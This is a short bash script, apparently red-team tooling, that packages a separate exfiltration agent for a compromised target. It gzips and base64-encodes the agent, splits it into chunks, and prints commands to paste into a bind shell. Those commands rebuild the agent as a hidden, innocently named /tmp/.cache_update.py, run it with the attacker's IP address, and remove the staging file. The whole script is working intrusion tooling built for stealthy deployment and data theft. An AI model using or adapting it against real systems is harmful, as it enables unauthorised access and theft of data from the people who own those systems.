#!/bin/bash
# ============================================
# Red Team - Deploy Exfil Agent to Target
# Generates the base64 command to paste into bind shell
# ============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AGENT_FILE="${SCRIPT_DIR}/exfil_agent.py"
ATTACKER_IP="${1:?Usage: ./deploy_agent.sh <ATTACKER_IP>}"

if [ ! -f "$AGENT_FILE" ]; then
    echo "[X] $AGENT_FILE not found"
    exit 1
fi

B64=$(gzip -c "$AGENT_FILE" | base64 -w0)
CHUNK_SIZE=400
TOTAL_CHARS=${#B64}
TOTAL_CHUNKS=$(( (TOTAL_CHARS + CHUNK_SIZE - 1) / CHUNK_SIZE ))

echo "[*] Deploy commands generated (${TOTAL_CHUNKS} chunks). Paste into C2 one by one:"
echo ""
echo "rm -f /tmp/.b64"

for (( i=0; i<TOTAL_CHARS; i+=CHUNK_SIZE )); do
    CHUNK="${B64:$i:$CHUNK_SIZE}"
    echo "echo -n '${CHUNK}' >> /tmp/.b64"
done

echo "base64 -d /tmp/.b64 | gunzip > /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP} && rm -f /tmp/.b64"
echo ""
echo "[*] Agent size: $(wc -c < "$AGENT_FILE") bytes"
echo "[*] Compressed base64: ${TOTAL_CHARS} chars -> ${TOTAL_CHUNKS} chunks"
